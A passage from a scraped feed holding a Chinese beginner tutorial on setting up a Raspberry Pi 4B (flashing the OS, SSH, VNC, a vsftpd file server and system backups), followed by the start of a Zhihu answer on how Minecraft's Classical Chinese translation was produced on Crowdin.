href=\"https://shumeipai.nxez.com/raspberry-pi-version-compare\" target=\"_blank\">参数对比 </a>表格，大家可以移步查看。</li></ul>\n<p>根据电子产品「买新不买旧」的思路，我建议正在持币观望、准备入坑的新手玩家一步到位购买 Raspberry Pi 4 Model B（也称「树莓派 4B」），因为它是最新的旗舰产品，功能和接口最为齐全，这既可以降低上手难度，又可以在我们还不确定要用树莓派来做什么的时候提供多种可玩性。</p>\n<p>除了树莓派本体，我们还需要购买一些配件：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>配件</th>\n<th>用途</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>容量 8 GB 以上的 TF 卡</td>\n<td>用于加载树莓派的系统</td>\n</tr>\n<tr>\n<td>TF 卡读卡器</td>\n<td>用于将 TF 卡接入电脑，烧录树莓派系统</td>\n</tr>\n<tr>\n<td>5 V / 3 A 以上的电源</td>\n<td>为树莓派供电</td>\n</tr>\n</tbody>\n</table></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/857274e0d30aca23ea44f68d68bd0b16.jpg\"><figcaption>▲ 买齐这些就够了。</figcaption></figure><p>对于树莓派的购买渠道，在树莓派基金会官网可以找到授权分销商的淘宝店铺，另外树莓派实验室也有官方淘宝店铺，这些都是比较靠谱的购买渠道。至于充电器，如果大家手头的充电器满足要求，就不需要购买了。需要留意的是所购买的树莓派型号的电源接口类型，树莓派 4B 使用的是 USB-C 接口，而更早的产品用的是 MicroUSB 接口。</p>\n<h2>烧录树莓派系统</h2>\n<p>树莓派是一个电脑，因此需要为它准备操作系统。我们买到树莓派之后，接下来要做的事情就是选择并下载合适的操作系统，并烧录到 TF 卡中。</p>\n<p>目前，树莓派基金会官方和第三方开发者为树莓派开发了多个操作系统。官方开发的系统称为 Raspberry Pi OS，曾用名 Raspbian，目前更新至 5.10 版本，兼容所有的树莓派产品（除了 Pico）。作为新手，我们就先使用官方推荐的 Raspberry Pi OS 桌面版来入门，等上手之后再捣鼓 <a href=\"https://make.quwj.com/member/2/bookmarks?category=37\" target=\"_blank\">其它好玩的系统 </a>不迟。如果 TF 卡存储空间充裕（≥ 16 GB），也可以使用「桌面 + 常用软件」的版本。</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>官方提供的操作系统</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><a href=\"https://downloads.raspberrypi.org/raspios_lite_armhf_latest\" target=\"_blank\">Raspberry Pi OS Lite 版</a></td>\n<td>没有图形化桌面，只有命令行界面。</td>\n</tr>\n<tr>\n<td><a href=\"https://downloads.raspberrypi.org/raspios_armhf_latest\" target=\"_blank\">Raspberry Pi OS 桌面版</a></td>\n<td>具有图形化桌面。</td>\n</tr>\n<tr>\n<td><a href=\"https://downloads.raspberrypi.org/raspios_full_armhf_latest\" target=\"_blank\">Raspberry Pi OS 桌面版 + 常用软件</a></td>\n<td>具有图形化桌面，预装了常用编程、办公、娱乐软件。</td>\n</tr>\n</tbody>\n</table></figure><p>我们在 PC 的浏览器中点击表格中的链接，下载操作系统的 img 文件。</p>\n<p>现在，我们将 TF 卡通过读卡器接入到 PC 中。</p>\n<p>接着，我们下载并安装一个用于向 TF 卡烧录 img 文件的软件 <a href=\"https://make.quwj.com/bookmark/327/go\" target=\"_blank\">Win32DiskImager</a>。</p>\n<p>打开 Win32DiskImager，在「映像文件」中选中下载到的 img 文件，确认「设备」选中的是 TF 卡对应的盘符，然后点击「写入」，此时软件弹出「确认覆盖」的警告，点击「Yes」开始就可以开始烧录。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/15/cd07d940dfa9cd1b331ac5931d8e1fe4.png\"></figure><p>烧录完成后，TF 卡会产生另一个 Windows 无法识别的分区，PC 随即弹出「无法访问卷」、「需要格式化」等警告，我们一律取消无视。</p>\n<p>此时，TF 卡已经安装上 Raspberry Pi OS 系统了，我们将 TF 卡插入树莓派背面卡槽中，树莓派就已经准备就绪，如果我们为它接上 USB 键盘、鼠标，通过 mini HDMI 接上显示器，再接上网线和电源，就可以像操作其他电脑一样操作树莓派了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/15/4943eb9579099fa84eaa22184537db6b.gif\"><figcaption>▲ 图源：<a href=\"https://www.raspberrypi.org/help/\" target=\"_blank\">Raspberry Pi Foundation</a>。</figcaption></figure><p>但我们并非要将树莓派作为主力电脑来使用，完全不需要如此兴师动众地为树莓派搭上这么多配件。我们只需要 TF 卡和电源线，就可以在 PC 上访问和控制树莓派了。如何做到呢？很简单，继续往下看吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/15/8f701058a2cedbc5564274dd6b998776.jpg\"><figcaption>▲我们只需要 TF 卡和电源线。</figcaption></figure><p>🍎注：在搭载 macOS 的电脑上向 TF 卡烧录系统，思路相同，可使用烧录软件 <a href=\"https://www.balena.io/etcher/\" target=\"_blank\">Etcher </a>。</p>\n<h2>设置 WiFi 连接和远程访问</h2>\n<p>Raspberry Pi OS 允许我们使用同一个 wifi 下的 PC 来访问和控制树莓派，这个功能叫 SSH 服务。为了使用这个服务来访问树莓派，我们在 PC 上完成对 TF 卡的烧录后，先不要弹出 TF 卡，而是在 PC 上准备两个文件拷贝到 TF 卡中 <sup class=\"ss-footnote\" href=\"https://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html\" title=\" 参考：《无屏幕和键盘配置树莓派 WiFi 和 SSH》\" footnote-id=\"2\">2</sup>： </p>\n<p>文件 1：我们新建一个 txt 文件，将其命名为「ssh」并删除后缀，注意不是「ssh.txt」。这个文件的作用是让树莓派开启 SSH 功能。 </p>\n<p>文件 2：我们同样新建一个 txt 文件，打开输入以下内容：</p>\n<pre class=\"language-null\"><code>country=CN\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\n \nnetwork={\nssid=\"WiFi_Name\"\npsk=\"WiFi_PassWord\"\nkey_mgmt=WPA-PSK\npriority=1\n}</code></pre>\n<p>其中，<code>ssid</code> 是我们家里的 WiFi 名称，<code>psk</code> 是 WiFi 的密码。内容输入完成后保存退出，将文件名称连同后缀修改为「wpa_supplicant.conf」。这个文件的作用是让树莓派按照我们文件中的内容连接 WiFi。</p>\n<ul><li>📖<i> </i>拓展阅读：针对不同 WiFi 加密方式的设置及更多的说明，请查看 <a href=\"https://shumeipai.nxez.com/2017/09/13/raspberry-pi-network-configuration-before-boot.html\" target=\"_blank\">此贴 </a>。</li></ul>\n<p>两个文件都准备完成后，将它们拷贝到 TF 卡的 boot 分区根目录下，然后就可以弹出 TF 卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/05f101f2496241f48673ce25a747273b.png\"><figcaption>▲将两个文件拷贝到 boot 分区的根目录下，留意两个文件的命名和后缀。</figcaption></figure><p>现在将 TF 卡插入树莓派背面卡槽中，并为树莓派上电。树莓派第一次启动，便会自动读取「wpa_supplicant.conf」文件，按文件内容接入 WiFi，并自动开启 SSH 服务。</p>\n<p>接下来，我们需要知道接入 WiFi 的树莓派在本地局域网中的 ip 地址，以便使用接入同一 WiFi 的 PC 来访问它。我们可以访问无线路由器的管理页面来查找树莓派分配到的 ip 地址：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/05/38f230054a3cc27632ac4cdbeb3e9cf4.jpg\"><figcaption>▲在无线路由器管理页面，通过接入时间、设备名称和新接入的设备等方法锁定树莓派并查看其 ip 地址。</figcaption></figure><p>现在，我们在 PC 下载并安装用于访问 SSH 服务的工具 <a href=\"https://www.ssh.com/academy/ssh/putty\" target=\"_blank\">PuTTY</a><a href=\"https://pan.baidu.com/share/link?shareid=2217335081&amp;uk=605377859\" target=\"_blank\">（懒人直达百度网盘下载 </a>）<sup class=\"ss-footnote\" href=\"https://shumeipai.nxez.com/2013/09/07/using-putty-to-log-in-to-the-raspberry-pie.html\" title=\" 参考：《使用 PuTTY 登录到树莓派》\" footnote-id=\"3\">3</sup>。</p>\n<p>打开 PuTTY，在「主机名称」中输入树莓派在局域网中的 ip 地址，其他选项无序改动，点击「打开」。如果是首次连接此 ip 地址，软件会弹出密钥确认的警告窗，我们点击「是」即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/201e83e4f413705a83adbc1388c4c396.png\"></figure><p>此时软件会弹出命令行窗口：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/9943140633a200d0a828921177943a89.png\"></figure><p>我们在 <code>login as: </code>中输入 Raspberry Pi OS 默认用户名「pi」然后按回车；接着在 <code>xxx password: </code>中输入密码「raspberry」按回车。注意输入的密码不会显示在命令行中，所以输入时看到没有反应不必怀疑是否出了问题，大胆输入即可。</p>\n<p>看到窗口显示 <code>pi@raspberrypi:~ $</code>，说明我们已经登录到树莓派了。现在我们就可以通过各种 Linux 指令来控制树莓派啦。</p>\n<p>🍎 注：在搭载 macOS 的电脑上通过 SSH 服务登录树莓派，可使用 <a href=\"https://www.ssh.com/academy/ssh/putty/mac\" target=\"_blank\">PuTTY on Mac </a>。</p>\n<h2>远程访问树莓派桌面</h2>\n<p>虽然我们在 PC 成功登录到树莓派，但进入的是它的命令行界面。作为新手的我们，当然还是希望能够访问更加熟悉的图形化桌面。这是没问题的，这次我们要用到的是 Raspberry Pi OS 的 VNC 服务 <sup class=\"ss-footnote\" href=\"https://shumeipai.nxez.com/2018/08/31/raspberry-pi-vnc-viewer-configuration-tutorial.html\" title=\" 参考：《树莓派 VNC Viewer 远程桌面配置教程》\" footnote-id=\"4\">4</sup>。</p>\n<p>首先需要开启 VNC 服务，我们在 PC 上通过 SSH 登录到树莓派命令行窗口，输入以下指令进入 Raspberry Pi OS 的配置页面：</p>\n<pre class=\"language-null\"><code>sudo raspi-config</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/3d89ef3d6fed01cbfee681a38cd68f53.png\"><figcaption>▲Raspberry Pi OS 配置页面</figcaption></figure><p>在配置页面，依次选择「3 Interface Options」&gt;「P3 VNC」，按回车，界面提示「Would you like the VNC server to be enabled?」，选择「Yes」即可开启 VNC 服务。此后系统自动返回到配置页面，选择「Finish」退出配置页面，返回命令行窗口。</p>\n<p>接下来，我们在 PC 下载并安装用于访问 VNC 的客户端 <a href=\"https://www.realvnc.com/en/connect/download/viewer/\" target=\"_blank\">VNC Viewer</a>。</p>\n<p>打开 VNC Viewer，在顶部 ip 地址框中输入树莓派在局域网中的 ip 地址，按回车连接，首次连接照例弹出安全警告，我们照例同意。此时软件弹出授权窗口，我们输入账号密码后点「OK」，软件就成功远程登录到树莓派的图形化桌面啦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/ccd6136872f06854dcdf7243b3a0d209.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/ad9497098d988cdd36920c454aa748b9.png\"><figcaption>▲熟悉的图形化桌面</figcaption></figure><p>🍎 注：在搭载 macOS 的电脑上通过 VNC 服务登录树莓派桌面，可使用 <a href=\"https://www.realvnc.com/en/connect/download/viewer/macos/\" target=\"_blank\">VNC Viewer for macO</a><a href=\"https://www.realvnc.com/en/connect/download/viewer/macos/\">S </a>。</p>\n<p>接下来介绍在 PC 通过 VNC Viewer 远程访问树莓派桌面经常会遇到的两个问题以及它们的解决方法。</p>\n<h3>如何解决「cannot currently show the desktop」问题</h3>\n<p>我们按照上述步骤操作，可能会遇到以下问题：成功在 VNC Viewer 中连接到树莓派，但是弹出的窗口却是黑屏，并显示「cannot currently show the desktop」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/23/c85a62143a96ef98d1e9d49c39396988.png\"></figure><p>这是由于 Raspberry Pi OS 的桌面分辨率不合适导致的。解决方法很简单：</p>\n<p>使用 PuTTY 登陆到树莓派命令行窗口，同样输入 <code>sudo raspi-config</code> 进入配置界面，依次选择「2 Display Options」&gt;「D1 Resolution」，然后选择 1280×720 或 1920×1080 等分辨率，保存退出。在 VNC Viewer 中重新进行连接，就可以成功显示桌面啦。</p>\n<h3>如何调整 VNC Viewer 显示树莓派桌面的分辨率</h3>\n<p>紧接上一个问题，我们明明已经在配置中将 Raspberry Pi OS 的桌面分辨率设置为 1920×1080 的分辨率了，为什么我们在 PC 的 VNC Viewer 上访问桌面时，分辨率仍然很低呢：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/4c2a7d8f0347daeaf3409d065db37d9a.jpg\"><figcaption>▲在 PC 通过 VNC Viewer 访问树莓派桌面，即使最大化窗口，画面也无法填满 PC 屏幕</figcaption></figure><p>这是由于我们虽然修改了 Raspberry Pi OS 的桌面分辨率，但却没有修改 VNC 服务的分辨率所导致的。经过调研，有一个解决方法：</p>\n<p>我们在命令行窗口中（可以使用 PuTTY 登录命令行窗口，或者在 VNC Viewer 所连接的桌面上打开命令行窗口）执行以下指令：</p>\n<pre class=\"language-null\"><code>vncserver -geometry 1920x1080</code></pre>\n<p>这句指令的作用是将 VNC 服务的显示分辨率修改为 1920×1080。执行后，树莓派提示生成了另一个端口「ip 地址:1」供 VNC Viewer 连接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/56e42b1497cc20c347f29aa7b046abea.png\"></figure><p>我们在 VNC Viewer 中输入新端口地址「ip 地址:1」来连接，输入账号密码登录，这个窗口的分辨率就是 1920×1080 啦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/082b63caf851213a93fb76c398888e47.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/21/20eb56adc1dcec6a1cd959bb8f2328fa.jpg\"><figcaption>▲现在 VNC Viewer 访问到的树莓派桌面分辨率才是 1920×1080</figcaption></figure><p>不过新的窗口显示的鼠标指针变成了「×」号。我们在新窗口的命令行中执行第二句指令：</p>\n<pre class=\"language-null\"><code>lxappearance</code></pre>\n<p>即可将鼠标指针切换回熟悉的箭头。</p>\n<h2>在 PC 和树莓派之间传输文件</h2>\n<p>我们已经可以很方便地在 PC 上访问树莓派的命令行窗口和桌面了。现在，我们来搭建在 PC 和树莓派之间传输文件的功能，我们会在树莓派上搭建一个 FTP 服务器，所用到的工具是 vsftpd，一款运行于类 UNIX 系统上的 FTP 服务器。</p>\n<p>我们打开树莓派的命令行窗口（再复习一遍：我们可以使用 PuTTY 登录命令行窗口，或者使用 VNC Viewer 登录到桌面，然后打开命令行窗口），输入以下指令来安装 vsftpd：</p>\n<pre class=\"language-null\"><code>sudo apt-get install -y vsftpd</code></pre>\n<p>安装完毕后，输入指令打开 vsftpd 的配置文件，进行一些必要的设置：</p>\n<pre class=\"language-null\"><code>sudo nano /etc/vsftpd.conf</code></pre>\n<p>在打开的配置文件中，我们将以下内容前的#号去掉，来让这行内容生效：</p>\n<pre class=\"language-null\"><code>anonymous_enable=NO\nlocal_enable=YES\nwrite_enable=YES\nlocal_umask=022</code></pre>\n<p>完成后，按「ctrl+o」保存文件，再按「ctrl+x」退出文件编辑，返回命令行窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/331fe4c8698c0c8f05e073163954fe37.png\"><figcaption>▲「vsftpd.conf」文件修改前</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/7b5e93a3bbdcd83f78a3065afd854ded.png\"><figcaption>▲「vsftpd.conf」文件修改后</figcaption></figure><ul><li>📖<i> </i>拓展阅读：这些内容的作用如下：</li></ul>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>anonymous_enable=NO</td>\n<td>不允许匿名用户访问我们所搭建的 FTP 服务器</td>\n</tr>\n<tr>\n<td>local_enable=YES</td>\n<td>允许本地用户访问 FTP 服务器</td>\n</tr>\n<tr>\n<td>write_enable=YES</td>\n<td>允许向 FTP 服务器执行写入操作</td>\n</tr>\n<tr>\n<td>local_umask=022</td>\n<td>设定上传后文件的权限掩码</td>\n</tr>\n</tbody></table></figure><p>随后，在命令行窗口中输入指令启动 vsftpd 服务：</p>\n<pre class=\"language-null\"><code>sudo service vsftpd start</code></pre>\n<p>在树莓派上的操作就已经完成了，树莓派上现在已经搭建了一个 FTP 服务器。</p>\n<p>现在，我们在 PC 下载并安装用于访问 FTP 服务器的客户端 <a href=\"https://www.filezilla.cn/download\" target=\"_blank\">FileZilla</a>。</p>\n<p>打开 FileZilla，在顶部「主机」地址框中输入树莓派在局域网中的 ip 地址、用户名和密码，端口为 22。然后点击「快速连接」。连接成功后，我们就可以在「远程站点」中看到树莓派的文件目录了。现在，我们就可以很方便地通过拖拽在 PC 和树莓派之间双向传输文件了，十分方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/55ce11f2c78d1b15a7cc6b8966a54334.png\"></figure><p>🍎 注：在搭载 macOS 的电脑上访问树莓派的 FTP 服务器，使用 <a href=\"https://www.filezilla.cn/download/client\" target=\"_blank\">FileZilla MACOSX X8</a><a href=\"https://www.filezilla.cn/download/client\">6 </a>。</p>\n<h2>备份树莓派系统</h2>\n<p>现在，我们已经可以很方便地在 PC 上访问和控制树莓派，并进行文件传输，我们的树莓派折腾之旅就正式开始了。在折腾树莓派的过程中，我们少不了在系统中安装和配置各种软件、Python 库、环境依赖等等。搞机是有风险的，为了在我们将系统折腾翻车的时候有一个撤回的机会，我们可以在适当的时候对系统进行备份，以备有需要时可以恢复系统。在本教程最后一个内容里，我们来看看如何备份树莓派的系统。</p>\n<p>根据调研和实测，目前有两种备份树莓派系统的方法，它们有各自的适用范围。以下分别介绍这两种方法。</p>\n<h3>对 TF 卡进行完整备份</h3>\n<p>我们在 PC 上用来向 TF 卡烧录系统的软件 Win32DiskImager，也可以用来将 TF 卡上的系统完整备份为一个镜像文件。</p>\n<p>我们把树莓派关机后，将 TF 卡拔出，通过读卡器连到 PC 上（照例忽视系统弹出的「需要格式化」等警告）。在 PC 上打开 Win32DiskImager，在「映像文件」中选择准备存放镜像文件的路径，并输入镜像文件名称和「.img」后缀。确认「设备」选中的是 TF 卡 boot 分区对应的盘符，然后点击「读取」，此时软件会从「设备」向「映像文件」传输文件，完成后，TF 卡上的树莓派系统就备份到 <code>D:/Raspberry Pi/systemBackUp.img</code> 这个镜像文件中了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/e858975b4ba17be316a69c98a4a823f8.png\"></figure><p>现在，我们就将树莓派现在的系统完整备份到了这个镜像文件。想恢复这个系统时，我们只需要将 TF 卡格式化之后，按照上文「2. 烧录树莓派系统」中的操作，将此镜像文件烧录到 TF 卡中即可。</p>\n<p>推荐大家使用 <a href=\"https://www.sdcardformatter.com/download/\" target=\"_blank\">SD Card Formatter</a> 来格式化 TF 卡，有 Windows 和 MacOS 版本。它可以十分方便、干净完成对 TF 卡的格式化，不容易误格式化其他硬盘。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/05/5e439e86cd2718d4f5793aa516d990b8.png\"><figcaption>无需其他设置，直接按「Format」即可完成格式化。</figcaption></figure><p>这个备份系统的方法操作简单，但是它的缺点是需要将 TF 卡完整备份，所生成的镜像文件体积等于 TF 卡的容量。因此这种方法比较适用于对小容量 TF 卡（≤ 16 GB）的备份，对于大容量的 TF 卡（比如 ≥ 128 GB），每次备份都会产生一个 128 GB 的镜像文件，这显然是不科学的。这就引出了我们的第二个备份方法。</p>\n<h3>使用 rpi-backup 脚本进行备份</h3>\n<p>这种方法使用大佬编写的 rpi-backup 脚本对树莓派系统进行备份。这个备份方法所生成的镜像文件体积是系统已用空间的 1.2 倍，相比于第一种备份方法，这种方法可以显著缩小镜像文件的体积，节省镜像文件所占用的磁盘空间。</p>\n<p>这个备份方案需要在树莓派上操作。我们需要将 rpi-backup 脚本文件拷贝到树莓派中。我们登录到树莓派命令行窗口，执行以下指令来从 Github 克隆脚本文件到树莓派上：</p>\n<pre class=\"language-null\"><code>git clone https://github.com/nanhantianyi/rpi-backup.git</code></pre>\n<p>我们也可以在 PC 上从 Github 下载 <a href=\"https://github.com/nanhantianyi/rpi-backup\" target=\"_blank\">脚本 </a>并将其通过 ftp 传输到到树莓派中。</p>\n<p>接下来，在树莓派命令行窗口中执行 cd 指令跳转到脚本所在的路径，比如我将脚本文件存放在 <code>pi/Downloads/rpi-backup-master</code> 路径下：</p>\n<pre class=\"language-null\"><code>cd Downloads/rpi-backup-master</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/05/7a7d812bbf34e4599a8e7f6ecbbe5da1.png\"><figcaption>脚本文件所在的路径</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/05/07945fdefee97ce2168b50ac5990fb4f.png\"><figcaption>▲利用 cd 指令进入到脚本文件所在路径中</figcaption></figure><p>现在，在此路径下执行以下指令即可执行「back.sh」脚本来将树莓派系统备份为镜像文件：</p>\n<pre class=\"language-null\"><code>sudo bash back.sh xxx.img</code></pre>\n<p>其中「xxx」为镜像文件名称。所生成的镜像文件将存放在「back.sh」同一路径下。我们可以修改「xxx」内容来指定镜像文件的存放路径和名称，如 <code>Documents/systemBackUp.img</code> 等。恢复系统时，同样只需要将 TF 卡格式化，然后将备份的镜像文件烧录到 TF 卡中即可。</p>\n<p>我使用这个方法对我的树莓派的系统进行备份，结果如下：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>项目</th>\n<th>体积</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>TF 卡</td>\n<td>32 GB</td>\n</tr>\n<tr>\n<td>系统已用空间</td>\n<td>6.7 GB</td>\n</tr>\n<tr>\n<td>备份系统后生成的镜像文件</td>\n<td>8.3 GB</td>\n</tr>\n</tbody>\n</table></figure><p>可以看到， 镜像文件体积大约是系统已用空间的 1.24 倍，远小于 TF 卡的容量。</p>\n<p>这种备份方法并非没有缺点。它所生成的镜像文件是保存 TF 卡中的，如果 TF 卡容量不大，剩余的空间不多，我们需要将硬盘挂载到树莓派上合适的目录下，然后将镜像文件保存到硬盘中，这些操作可能对新手不太友好。因此，大家根据自己实际情况选择合适自己的系统备份方法吧。</p>\n<h2>尾声</h2>\n<p>2021 年的树莓派入坑指南至此接近尾声，我们通过下表来回顾、概括一下本文涉及的操作：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>操作</th>\n<th>实现途径</th>\n<th>所用的工具 / 软件</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>烧录树莓派系统</td>\n<td>\\</td>\n<td>\n<a href=\"https://make.quwj.com/bookmark/327/go\" target=\"_blank\">Win32DiskImager</a>、<a href=\"https://www.balena.io/etcher/\" target=\"_blank\">Etcher</a>\n</td>\n</tr>\n<tr>\n<td>在 PC 访问树莓派命令行窗口</td>\n<td>SSH</td>\n<td><a href=\"https://www.ssh.com/academy/ssh/putty\" target=\"_blank\">PuTTY</a></td>\n</tr>\n<tr>\n<td>在 PC 访问树莓派图形化界面</td>\n<td>VNC</td>\n<td><a href=\"https://www.realvnc.com/en/connect/download/viewer/\" target=\"_blank\">VNC Viewer</a></td>\n</tr>\n<tr>\n<td>在 PC 和树莓派之间传输文件</td>\n<td>FTP</td>\n<td><a href=\"https://www.filezilla.cn/download\" target=\"_blank\">FileZilla</a></td>\n</tr>\n<tr>\n<td>备份树莓派系统</td>\n<td>\\</td>\n<td>\n<a href=\"https://make.quwj.com/bookmark/327/go\" target=\"_blank\">Win32DiskImager</a>、<a href=\"https://github.com/nanhantianyi/rpi-backup\" target=\"_blank\">rpi-backup 脚本</a>\n</td>\n</tr>\n<tr>\n<td>恢复树莓派系统</td>\n<td>\\</td>\n<td>\n<a href=\"https://make.quwj.com/bookmark/327/go\" target=\"_blank\">Win32DiskImager</a>、<a href=\"https://www.balena.io/etcher/\" target=\"_blank\">Etcher</a>\n</td>\n</tr>\n</tbody>\n</table></figure><p>希望本文能对大家有所帮助。如果你有好用的树莓派使用技巧，欢迎在评论区分享、讨论哟。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/66938"},{"title":"如何看待游戏《我的世界》（Minecraft）1.17.1 pre2 版本加入了文言文？","date":"2021-07-06 03:00:12","description":"\n<p>大家好，我是Minecraft文言语言的校对员ff98sha。</p>\n<p>前些天Minecraft文言语言上线了，借此机会写个回答和大家说说，Minecraft的翻译到底是个什么流程。关于文言翻译的来龙去脉可以先看看<a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv11957511%3Ffrom%3Dsearch\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">项目创始人的话</a>。</p>\n<h2>语言的增减</h2>\n<p>在Minecraft Java版1.1时代，游戏还只有36种<a href=\"http://link.zhihu.com/?target=https%3A//minecraft.fandom.com/zh/wiki/%25E8%25AF%25AD%25E8%25A8%2580\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">语言</a>，到了1.17.1便增长到了111种。近几年的语言申请是在<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1386\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin上的一个话题/表格</a>中申请的。可以在这上百层楼中看到有许多语言正等候加入游戏。Cuervo在2020年向Mojang提交了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft/discussions/1612\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">文言申请</a>，并在2021年初被通过。因此文言并不特殊，至少和克林贡语比起来（</p>\n<p>语言申请通过之后，Mojang会在这两个项目中开放该语言的翻译。当语言的翻译和审核进度达到一定百分比时，Mojang就会在定期的排查中将此语言加入到游戏中。例如，文言在正式加入游戏时，校对进度为56%。</p>\n<p>因此新语言要正式加入游戏，除了审批外，至少需要翻译和审核2000多个词条（约8000多个单词）。在Crowdin上Mojang开放了140个语言的翻译，但在1.17.1中仅有111个语言。剩下的那些语言中除了尚未上线过的，还有因为长期无人维护（而字符串又在不断增加）导致翻译进度很低，而从游戏中移除的（如这次移除的马恩岛语）。</p>\n<p><b>所以，各位看到的文言语言其实是尚未完工的。</b>在上线之前我们也没有得到任何的通知。于是乎，大家就会各种吐槽某些翻译有问题……</p>\n<p>自从看到b站的某介绍MC文言视频热度飙升，我们就紧急联系了许多up主，他们也在视频里介绍了“文言语言由玩家翻译，尚未完工，轻喷”的事。不过大多数人还是以为这是Mojang官方整的烂活（</p>\n<p><img src=\"https://pic1.zhimg.com/v2-660a1678869f20a12e08662e87647ddf_720w.jpg?rss\" data-caption=\"然未校者十之有四，請恕其拙。\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"427\" data-watermark=\"watermark\" data-original-src=\"v2-660a1678869f20a12e08662e87647ddf\" data-watermark-src=\"v2-304f578c38ec5da9809e0a3a7f6e68ee\" data-private-watermark-src=\"\"></p>\n<h2>翻译流程</h2>\n<p><b>Minecraft Java版的翻译全由社区完成</b>，其他版本由专门团队完成，在此不做讨论。</p>\n<p>Minecraft所在的翻译平台叫做<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Crowdin</a>（<a href=\"http://link.zhihu.com/?target=https%3A//zh.crowdin.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中文版</a>），Mojang开设了<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft</a>本体和<a href=\"http://link.zhihu.com/?target=https%3A//crowdin.com/project/minecraft-launcher\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Minecraft Launcher</a>两个项目。</p>\n<p>任何人都可以注册一个Crowdin账号，然后申请加入Minecraft项目。申请通过后就可以选择某个语言开始翻译了。</p>\n<p>普通用户的身份是译者，可以翻译词条，也可以对其他用户提交的翻译进行赞和踩。</p>\n<p>翻译后校对员会对译文进行校对。校对员是由Mojang钦定的、有能力管理语言的译者。目前简体中文的校对员是Cuervo和Powup333，文言的校对员是Cuervo和ff98sha。</p>\n<p>对于有大问题/已经核对的翻译，可以在右侧评论区提出一个问题（issue），并自动提醒校对员重新审查。</p>\n<p>有时候可能会看到有两个完全一样的翻译存在，这是因为校对员使用了全局替换功能，替换了所有翻译中的某个字符串。</p>\n<h2>翻译实装</h2>\n<p>在每两个快照发布前，Mojang会将Crowdin平台上的翻译下载后打包进游戏中。在这个过程中，会自动选择已翻译已校对的翻译。<b>对于已翻译未校对的翻译，则会自动选择Crowdin上排序靠前的翻译。翻译会按照得票数多少从高到低排，平票的按照时间顺序，新提交的会排在前面。</b></p>\n<p><b>于是，就导致了并未校对的译名加入游戏。</b>大家看到的半成品文言就充满了译名不统一、质量差、简繁混用、字形不统一等校对过程中需要解决的问题。当年的雷石东也是因为这个原因而出现的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f5c712ffdac22057c3adca5ff806005_720w.jpg?rss\" data-caption=\"我知道你们在找什么\" data-size=\"normal\" 